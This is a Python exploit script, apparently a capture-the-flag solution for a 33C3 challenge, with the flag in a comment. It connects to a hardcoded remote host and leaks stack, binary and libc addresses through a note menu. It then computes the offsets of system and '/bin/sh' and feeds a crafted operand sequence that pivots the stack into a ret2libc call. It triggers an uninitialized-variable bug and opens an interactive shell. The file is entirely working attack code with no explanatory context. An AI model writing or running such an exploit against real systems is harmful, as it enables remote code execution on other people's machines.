from pwnlib import *


# 33C3_L0rd_Nikon_would_l3t_u_1n

#s = Socket(("localhost", 1610))
s = Socket(("78.46.224.74", 4127))

s.ru(" - Exit\n> ")
s.send("1\n")
s.ru("Your note: ")

leaked = s.ru("\n0 - ")
s.ru(" - Exit\n> ")


stack_ptr, bin_ptr, stdout_ptr = struct.unpack("III", leaked[:12])
bin_base = bin_ptr - 0x6fb
libc_base = stdout_ptr - 0x1b6d60 + 0x1000*3

system = libc_base + 0x3a8b0 
bin_sh = libc_base + 1428431
pivot = libc_base + 0x000d762f  # libc_base + 0x000dae12 # adds 0x3c to esp

pivot = bin_base + 0x00001015

#pivot = 0x1deadbee


print "bin: 0x%x" % bin_base
print "libc: 0x%x" % libc_base
print "stack: 0x%x" % stack_ptr




s.send("2\n")

s.ru("Operator: ")
s.send("S\n")

for i in range(200):
	if i == 0x63:
		i = system
	
	if i == 0x64:
		i = bin_sh

	
	if i >= 0x80000000:
		i -= (1<<32)

	#s.ru("Operand: ")
	s.send("%d\n" % i)
	print i



target = pivot
if target >= 0x80000000:
	target -= (1<<32)

s.ru("Operand: ")
s.send("%d\n" % target)
s.ru("Operand: ")
s.send(".\n")
s.ru(" - Exit\n> ")


raw_input("trigger? ")
# trigger uninitialized variable use
s.send("5\n")
time.sleep(0.2)
s.send("0\n")

#print s.ru("0 - Take n").encode("hex")

s.interact()
